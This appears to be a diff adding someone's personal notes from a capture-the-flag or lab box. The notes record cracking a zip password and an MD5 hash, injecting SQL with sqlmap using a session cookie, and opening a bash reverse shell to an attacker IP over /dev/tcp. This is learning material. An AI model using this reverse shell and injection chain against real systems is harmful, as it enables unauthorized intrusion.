@@ -1,0 +1,47 @@
+Basic enumeration didnt do too much
+
+Used FTP creds from last box to gain access to the FTP server
+listed files, there was a zipped file that is password protected
+using JTR to try and break it
+
+JTR found that the password for the zip file was 741852963
+
+Using that we were able to unzip the file
+
+From there we can see that the username is admin and the password hash is 2cb42f8734ea607eefed3b70af13bbd3
+Trying a rainbow table for 2cb42f8734ea607eefed3b70af13bbd3 -> qwerty789
+
+login and get redirected to dashboard
+look at the page for anything interesting but dont really find anything
+go ahead and search for "test" and see a parameter being used, possible sqli?
+we get a redirect when trying to use sqlmap, need to add an auth cookie using --cookie=PHPSESSID=lutljm8dr0shkaogbj74ki3gpd
+sqlmap discovers a postgress db and is able to inject with unions
+
+dumped everything and just got the cars information, will try to get a shell?
+able to get a postgress shell, will try to get a reverse shell
+
+need to get better at reverse shells
+using the current shell we have we see the user simon with an interesting file `.sudo_as_admin_successful` -> this might not be anything
+
+tried to pull the postgress hash which was 2d58e0637ec1e94cdfba3d1c26b67d01, but coulndt find it with a rainbow tables
+
+tried to ping, not the best idea when using unstable shells, or at least limit the # of pings
+
+tried to add a php file using the shell
+
+looked up a hint, and I was going down the RIGHT path, just was spawning the reverse shell incorrectly
+
+bash -c ended up working
+
+Need to understand why this worked:
+`bash -c 'bash -i >& /dev/tcp/10.10.14.31/6000 0>&1'`
+
+But this didn't:
+`bash -i >& /dev/tcp/10.10.14.31/6000 0>&1`
+
+Inside of the sqlmap os shell, maybe its a nuance with the sql shell itself??
+
+
+gobuster found two pages
+index.php
+dashboard.php
